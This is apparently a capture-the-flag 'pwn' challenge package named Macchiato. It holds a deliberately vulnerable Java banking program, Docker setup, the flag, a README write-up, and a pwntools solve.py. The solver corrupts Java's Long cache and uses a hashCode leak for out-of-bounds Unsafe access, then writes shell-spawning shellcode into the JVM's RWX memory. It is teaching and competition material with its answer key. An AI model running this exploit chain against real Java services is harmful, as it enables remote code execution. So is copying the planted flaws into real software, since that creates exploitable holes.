{
    "Dockerfile": "FROM openjdk:11-slim-buster\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY flag.txt /pwn/flag.txt\nCOPY src /pwn\nWORKDIR /pwn\nRUN javac *.java\nENV JDK_JAVA_OPTIONS=\"-Xmx64M\"\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:'java Challenge',stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n",
    "flag.txt": "gigem{i_sur3_h0p3_n0b0dy_pwn5_th0s3_3_billi0n_d3v1c3s}\n",
    "Makefile": "NAME := macchiato\nPORT := 7010\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nclean:\n\tdocker container rm -f $(NAME)\n\trm -f $(NAME).zip\n\ndocker:\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\ndist:\n\tzip -r $(NAME).zip src Makefile Dockerfile\n",
    "README.md": "# Macchiato\n\nAuthor: `nhwn`\n\nI got tired of people exploiting my poor, defenseless Rust programs, so I wrote this challenge in the ultimate memory-safe language.\n\n## Solution\n\nLooking at the provided source code, an immediate red flag is the usage of `sun.misc.Unsafe` in `BlazinglyFastAccount`. This is an OpenJDK-internal class that allows access to native (and possibly exploitable!) functionality. However, to gain access to the `BlazinglyFastAccount` class, we first need to have a balance equal to `LONG_MAX`. To do this, we can login to a `RegularAccount` and underflow the balance via several withdrawals until it reaches `LONG_MAX`. Now that we have access to `BlazinglyFastAccount`, our goal is to figure out how to escape the bounds check.\n\n```java\nprivate boolean checkBounds(Long index) {\n    var geMin = index.compareTo(0L) >= 0;\n    var ltMax = index.compareTo(10L) < 0;\n    return geMin && ltMax;\n}\n```\n\nAt first glance, it seems impossible to avoid. However, if we look at the code in `Challenge.java`, we see that our input is used to load a static field of an arbitrary static class via [reflection](https://www.oracle.com/technical-resources/articles/java/javareflection.html) (assuming the field has type `Long[]` or `long[]`). \n\n```java\npublic static Object load(Class c, String field) {\n    try {\n        var f = c.getDeclaredField(field);\n        f.setAccessible(true);\n        return f.get(null);\n    } catch (Exception e) {\n        return null;\n    }\n}\n```\n\nSince this is OpenJDK 11, we'll get a [warning at runtime for any illegal access](https://openjdk.org/jeps/403), but the access will still be permitted. We can use this to load in the `cache` field of `java.lang.Long$LongCache` as the backing array of a `RegularAccount` (the `$` denotes that `LongCache` is an inner class of `java.lang.Long`).\n\n```java\n// https://github.com/openjdk/jdk11/blob/master/src/java.base/share/classes/java/lang/Long.java#L1147-L1156\nprivate static class LongCache {\n    private LongCache(){}\n\n    static final Long cache[] = new Long[-(-128) + 127 + 1];\n\n    static {\n        for(int i = 0; i < cache.length; i++)\n            cache[i] = new Long(i - 128);\n    }\n}\n```\n\nThis cache stores pre-allocated objects of type `Long` for the values -128 to 127 (inclusive) and is transparently used during [autoboxing](https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html). Since there is no direct comparison against the upper bound of 10 inside a `RegularAccount`, we can alter the cached `Long` object for 10 (at index 138) and make it `LONG_MAX`, rendering the bounds check in `BlazinglyFastAccount` useless. This gives us arbitrary indexing into the memory beyond the end of `arr` in any `BlazinglyFastAccount`. Given that we can check the current balance and withdraw an arbitrary amount of money, we now have read and write primitives (relative to the address of the `arr` field).\n\nNow, we want to further develop them into arbitrary accesses (i.e., accesses to absolute addresses). To do this, we need to determine the base address of the array at runtime. More concretely, we need to find the current `BlazinglyFastAccount` on the JVM heap since it contains a reference to our array object. Conveniently, we are given the output of `hashCode()` for each accessed account. Contrary to popular belief, this is _not_ the address of the hashed object in OpenJDK 11. Looking at the default parameters within the HotSpot JVM, we see:\n\n```cpp\n// https://github.com/openjdk/jdk11/blob/master/src/hotspot/share/runtime/globals.hpp#L856-L857\nexperimental(intx, hashCode, 5,                                           \\\n           \"(Unstable) select hashCode generation algorithm\")           \\\n```\n\nIn the underlying native implementation of `hashCode()`, we have:\n```cpp\n// https://github.com/openjdk/jdk11/blob/master/src/hotspot/share/runtime/synchronizer.cpp#L669-L708\nstatic inline intptr_t get_next_hash(Thread * Self, oop obj) {\n  intptr_t value = 0;\n  if (hashCode == 0) {\n    // This form uses global Park-Miller RNG.\n    // On MP system we'll have lots of RW access to a global, so the\n    // mechanism induces lots of coherency traffic.\n    value = os::random();\n  } else if (hashCode == 1) {\n    // This variation has the property of being stable (idempotent)\n    // between STW operations.  This can be useful in some of the 1-0\n    // synchronization schemes.\n    intptr_t addrBits = cast_from_oop<intptr_t>(obj) >> 3;\n    value = addrBits ^ (addrBits >> 5) ^ GVars.stwRandom;\n  } else if (hashCode == 2) {\n    value = 1;            // for sensitivity testing\n  } else if (hashCode == 3) {\n    value = ++GVars.hcSequence;\n  } else if (hashCode == 4) {\n    value = cast_from_oop<intptr_t>(obj);\n  } else {\n    // Marsaglia's xor-shift scheme with thread-specific state\n    // This is probably the best overall implementation -- we'll\n    // likely make this the default in future releases.\n    unsigned t = Self->_hashStateX;\n    t ^= (t << 11);\n    Self->_hashStateX = Self->_hashStateY;\n    Self->_hashStateY = Self->_hashStateZ;\n    Self->_hashStateZ = Self->_hashStateW;\n    unsigned v = Self->_hashStateW;\n    v = (v ^ (v >> 19)) ^ (t ^ (t >> 8));\n    Self->_hashStateW = v;\n    value = v;\n  }\n\n  value &= markOopDesc::hash_mask;\n  if (value == 0) value = 0xBAD;\n  assert(value != markOopDesc::no_hash, \"invariant\");\n  TEVENT(hashCode: GENERATE);\n  return value;\n}\n```\n\nThus, the default algorithm generates hashes based on thread-local state. For our purposes, we actually don't care about _how_ the hash is generated; we care about _where_ it's stored. In general, every JVM object has a [header that stores metadata about the object](https://shipilev.net/jvm/objects-inside-out/#_mark_word). In particular, the hash is stored in little-endian within the first few bytes of the mark word. As a result, we can use the leaked hash as a sentinel value to find the beginning of our `BlazinglyFastAccount`. Since the static arrays in `BlazinglyFastBank` are allocated early on in the program, we can be certain that our target `BlazinglyFastAccount` will lie at a higher address within the JVM heap (we have enough memory such that relocation by the garbage collector is not a problem). Thus, we just need to linearly scan past the end of our array until we find an 8-byte chunk that contains our leaked hash (thankfully, objects are aligned to 8 bytes by default in OpenJDK 11, so we're guaranteed that the entire hash will be in a single chunk). Once we find the leaked hash, we then need to retrieve the bytes of the `arr` field. Compressed klass pointers are enabled by default in OpenJDK 11, so we need to look 12 bytes past the beginning of the object header (8 bytes for the mark word and 4 bytes for the klass pointer) to obtain the 4 bytes of our array's address in little-endian (`arr` is the only non-static field in `BlazinglyFastAccount`, so it's immediately after the header). \n\nNow, we need to interpret our leaked address. While OpenJDK 11 defaults to using [compressed oops](https://www.baeldung.com/jvm-compressed-oops#1basic-optimization) (which right-shifts object addresses by 3 to take advantage of 8-byte alignment), the provided Dockerfile uses `-Xmx64M` in the JVM arguments to constrain the maximum heap space to 64 MB, so object addresses will be absolute and won't require any shifts for adjustment. As a result, we can directly interpret our 4-byte address as the starting address of our array. To compute the base address of the _elements of the array_, we need to add 16 to our address (8 bytes for the mark word, 4 bytes for the klass pointer, and 4 bytes for the array length). By subtracting this computed address from any target address and dividing by 8 (`long` is 8 bytes), we can index into arbitrary 8-byte chunks.\n\nWith our new arbitrary read and write primitives, our goal is now arbitrary code execution. Luckily for us, there are several RWX segments present in a JVM process. In particular, OpenJDK 11 maps 0x2000 bytes starting from 0x800000000 as RWX for [class data sharing](https://docs.oracle.com/javase/8/docs/technotes/guides/vm/class-data-sharing.html) (this can be verified from GDB or by causing a segfault and observing the printed memory maps from the resulting JVM crash report). \n\n```cpp\n// https://github.com/openjdk/jdk11/blob/master/src/hotspot/share/memory/metaspaceShared.cpp#L252-L260\n// On 64-bit VM, the heap and class space layout will be the same as if\n// you're running in -Xshare:on mode:\n//\n//                              +-- SharedBaseAddress (default = 0x800000000)\n//                              v\n// +-..---------+---------+ ... +----+----+----+----+----+---------------+\n// |    Heap    | Archive |     | MC | RW | RO | MD | OD | class space   |\n// +-..---------+---------+ ... +----+----+----+----+----+---------------+\n// |<--   MaxHeapSize  -->|     |<-- UnscaledClassSpaceMax = 4GB ------->|\n```\n```cpp\n// https://github.com/openjdk/jdk11/blob/master/src/hotspot/share/memory/metaspaceShared.cpp#L1489-L1491\n// AUTHOR'S NOTE: \"md\" is supposed to be \"mc\" in the following comment\n\n// NOTE: md contains the trampoline code for method entries, which are patched at run time,\n// so it needs to be read/write.\nwrite_region(mapinfo, MetaspaceShared::mc, &_mc_region, /*read_only=*/false,/*allow_exec=*/true);\n```\n\nAs shown in the above code, this is a _fixed_ address that contains several trampoline entries that jump to loaded methods. Even more conveniently, the region is unpopulated past 0x800001f60 (this can be verified from GDB by examining this address for instructions), so all we need to do is use our arbitrary write primitive to inject shellcode at this address, then patch one of the trampoline entries to jump to our code. Based on rigorous empirical analysis (read: I set several hundred breakpoints in GDB, then checked if any were triggered), the first trampoline entry is used very frequently, so we can use it as our victim entry (this is located at 0x800000000). For our actual shellcode payload, we can just use the standard `shellcraft.sh()` from `pwntools`. The last wrinkle is that our write primitive may need several accesses to set a memory location to a specific value due to the maximum cap of `LONG_MAX` for any given withdrawal, so the patch to the trampoline requires a small change in the amount to be atomic (if a thread jumps to the entry before the write fully goes through, it may either jump to an invalid location or execute an invalid instruction, which will prematurely kill the process). See `solve.py` for the full details.\n\nFlag: `gigem{i_sur3_h0p3_n0b0dy_pwn5_th0s3_3_billi0n_d3v1c3s}`\n",
    "solve.py": "from pwn import *\n\ncontext.arch = \"amd64\"\n\nif args.REMOTE:\n    p = remote(\"localhost\", 7010)\nelse:\n    from os import chdir\n    chdir(\"src\")\n    cmd = \"java Challenge\"\n    p = process(cmd, shell=True)\n\ndef login(bank, name):\n    p.sendline(b\"1\")\n    p.sendline(bank)\n    p.sendline(name)\n    p.recvuntil(b\"ID \")\n    return int(p.recvuntil(b\"!\", drop=True).decode())\n\ndef read(i):\n    p.sendline(b\"1\")\n    p.sendline(str(i).encode())\n    p.recvuntil(b\" $\")\n    v = int(p.recvlineS())\n    return v\n\ndef get_block(i):\n    return p64(read(i), sign=\"signed\")\n\nLONG_MAX = 2 ** 63 - 1\nULONG_MAX = 2 ** 64 - 1\n\ndef withdraw(i, x):\n    p.sendline(b\"2\")\n    p.sendline(str(i).encode())\n    p.sendline(str(x).encode())\n\ndef write(i, target, check=True):\n    old = read(i)\n    d = (old - target) % ULONG_MAX\n    q, r = divmod(d, LONG_MAX)\n    for _ in range(q):\n        withdraw(i, LONG_MAX)\n    withdraw(i, r)\n    # I can't do math lmao\n    if check:\n        if read(i) != target:\n            withdraw(i, 1)\n\nlogin(b\"RegularBank\", b\"me\")\n\np.sendline(b\"2\")\nwrite(0, LONG_MAX)\np.sendline(b\"3\")\n\n# upgrade\np.sendline(b\"3\")\n\nlogin(b\"java.lang.Long$LongCache\", b\"cache\")\n\np.sendline(b\"2\")\nwrite(128 + 10, LONG_MAX)\np.sendline(b\"3\")\n\nleaked_hash = login(b\"BlazinglyFastBank\", b\"notMeEither\")\nneedle = p32(leaked_hash)\n\np.sendline(b\"2\")\n\nbase_index = 549\nn = 1\nfor i in range(base_index, base_index + n):\n    block = get_block(i)\n    if needle in block:\n        next_block = get_block(i + 1)\n        arr_obj_base = u32(next_block[4:8])\n        break\n\narr_elems_base = arr_obj_base + 16\ndef addr_to_index(a):\n    return (a - arr_elems_base) // 8\n\nrwx_base = 0x800000000\nfree = 0x1f60\nfree_rwx_base = rwx_base + free\n\ndef get_ints(unpadded_payload):\n    def next_8(x):\n        return ((x + 8 - 1) // 8) * 8;\n    n = len(unpadded_payload)\n    padding = (next_8(n) - n) * b\"A\"\n    payload = unpadded_payload + padding\n    return [u64(payload[i:i + 8], sign=\"signed\") for i in range(0, n, 8)]\n\njump = f\"\"\"\nmovabs r10, {free_rwx_base}\n\"\"\"\n\nshellcode_ints = get_ints(asm(shellcraft.sh()))\njump_int = get_ints(asm(jump)[:8])[0]\n\nshellcode_base_index = addr_to_index(free_rwx_base)\njump_index = addr_to_index(rwx_base)\n\nfor i, s in enumerate(shellcode_ints):\n    write(shellcode_base_index + i, s)\n\nwrite(jump_index, jump_int, check=False)\n\np.interactive()\n",
    "src\\Account.java": "public abstract class Account {\n    abstract Long get(Long index);\n    abstract void set(Long index, Long value);\n    Long sum() {\n        Long s = 0L;\n        for (Long i = 0L; i < 10L; ++i) {\n            s += get(i);\n        }\n        return s;\n    }\n    void withdraw(Long index, Long value) {\n        set(index, get(index) - value);\n    }\n}\n",
    "src\\BlazinglyFastAccount.java": "/// zoomies\nimport sun.misc.Unsafe;\n\npublic class BlazinglyFastAccount extends Account {\n    static Unsafe u = (Unsafe)Challenge.load(Unsafe.class, \"theUnsafe\");\n    long[] arr; \n    private boolean checkBounds(Long index) {\n        var geMin = index.compareTo(0L) >= 0;\n        var ltMax = index.compareTo(10L) < 0;\n        return geMin && ltMax;\n    }\n    public BlazinglyFastAccount(long[] arr) {\n        this.arr = arr;\n    }\n    public Long get(Long index) {\n        var base = u.arrayBaseOffset(long[].class);\n        return checkBounds(index) ? u.getLong(this.arr, base + index * 8) : 0;\n    }\n    public void set(Long index, Long value) {\n        if (checkBounds(index)) {\n            var base = u.arrayBaseOffset(long[].class);\n            u.putLong(this.arr, base + index * 8, value);\n        }\n    }\n}\n\n",
    "src\\BlazinglyFastBank.java": "public class BlazinglyFastBank {\n    public static long[] me = new long[10];\n    public static long[] notMe = new long[10];\n    public static long[] notMeEither = new long[10];\n}\n\n",
    "src\\Challenge.java": "import java.util.Scanner;\n\npublic class Challenge {\n    public static void displayBank(Class bank) {\n        System.out.println();\n        System.out.println(bank.getSimpleName());\n        System.out.println(\"----------------------------\");\n        for (var f: bank.getDeclaredFields()) {\n            System.out.println(f.getName());\n        }\n    }\n    public static void listUsers() {\n        displayBank(RegularBank.class);\n        displayBank(BlazinglyFastBank.class);\n    }\n    public static Object load(String name, String field) {\n        try {\n            return load(Class.forName(name), field);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n    public static Object load(Class c, String field) {\n        try {\n            var f = c.getDeclaredField(field);\n            f.setAccessible(true);\n            return f.get(null);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n    public static long readLong(Scanner sc) {\n        var ret = sc.nextLong();\n        sc.nextLine();\n        return ret;\n    }\n    public static void main(String[] args) {\n        var sc = new Scanner(System.in);\n        Account acc = null;\n        var canZoom = false;\n\n        System.out.println(\"Welcome to the most secure banking system on the planet!\\n\");\n        while (true) {\n            System.out.println(\"\\n1) Login\");\n            System.out.println(\"2) Manage funds\");\n            System.out.println(\"3) Upgrade user\");\n            System.out.println(\"4) Exit\");\n            System.out.println(\"\\nEnter an option:\");\n            switch ((int)readLong(sc)) {\n                case 1:\n                    System.out.println(\"\\nHere are the available banks and users:\");\n                    listUsers();\n                    System.out.println(\"\\nEnter your bank name:\");\n                    var bank = sc.nextLine();\n                    var requestedZoomies = bank.equals(\"BlazinglyFastBank\");\n                    if (requestedZoomies && !canZoom) {\n                        System.out.println(\"\\nConsider becoming a regular customer to upgrade to our blazingly fast account system.\\n\");\n                        break;\n                    }\n                    System.out.println(\"\\nEnter your username:\");\n                    var name = sc.nextLine();\n                    var tmp = load(bank, name);\n                    if (tmp == null) {\n                        System.out.println(\"\\nInvalid account.\");\n                        break;\n                    }\n                    if (requestedZoomies) {\n                        acc = new BlazinglyFastAccount(long[].class.cast(tmp));\n                    } else {\n                        acc = new RegularAccount(Long[].class.cast(tmp));\n                    }\n                    System.out.printf(\"\\nSuccessfuly logged in with ID %d!\\n\", acc.hashCode());\n                    break;\n                case 2:\n                    if (acc == null) {\n                        System.out.println(\"\\nYou need to login to an account first.\");\n                        break;\n                    }\n                    var exitInner = false;\n                    while (!exitInner) {\n                        System.out.println(\"\\n1) Examine balance\");\n                        System.out.println(\"2) Withdraw funds\");\n                        System.out.println(\"3) Go back\");\n                        System.out.println(\"\\nEnter an option:\");\n                        switch ((int)readLong(sc)) {\n                            case 1:\n                                System.out.println(\"\\nEnter an account number (0-10):\");\n                                System.out.printf(\"\\nYour balance is now $%d\\n\", acc.get(readLong(sc)));\n                                break;\n                            case 2:\n                                System.out.println(\"\\nEnter an account number (0-10):\");\n                                var withdrawIndex = readLong(sc);\n                                System.out.println(\"\\nEnter an amount to withdraw:\");\n                                var v = readLong(sc);\n                                if (v >= 0) {\n                                    acc.withdraw(withdrawIndex, v);\n                                } else {\n                                    System.out.println(\"\\nYou can't withdraw negative money.\");\n                                }\n                                break;\n                            case 3:\n                                exitInner = true;\n                                break;\n                            default:\n                                System.out.println(\"\\nInvalid option.\");\n                        }\n                    }\n                    break;\n                case 3:\n                    if (acc == null) {\n                        System.out.println(\"\\nYou need to login to an account first.\");\n                        break;\n                    }\n                    if (acc.sum() == Long.MAX_VALUE) {\n                        canZoom = true;\n                    } else {\n                        System.out.println(\"\\nDeposit more money to upgrade to our blazingly fast account system.\\n\");\n                    }\n                    break;\n                case 4:\n                    System.out.println(\"Bye!\");\n                    return;\n                default:\n                    System.out.println(\"\\nInvalid option.\");\n            }\n        }\n    }\n}\n",
    "src\\RegularAccount.java": "public class RegularAccount extends Account {\n    Long[] arr; \n    public RegularAccount(Long[] arr) {\n        this.arr = arr;\n    }\n    public Long get(Long index) {\n        return this.arr[index.intValue()];\n    }\n    public void set(Long index, Long value) {\n        this.arr[index.intValue()] = value;\n    }\n}\n",
    "src\\RegularBank.java": "public class RegularBank {\n    public static Long[] me = init();\n    public static Long[] someoneElse = init();\n    public static Long[] anotherStranger = init();\n    static Long[] init() {\n        var ret = new Long[10];\n        for (int i = 0; i < 10; ++i) {\n            ret[i] = new Long(0);\n        }\n        return ret;\n    }\n}\n",
    "category": "pwn"
}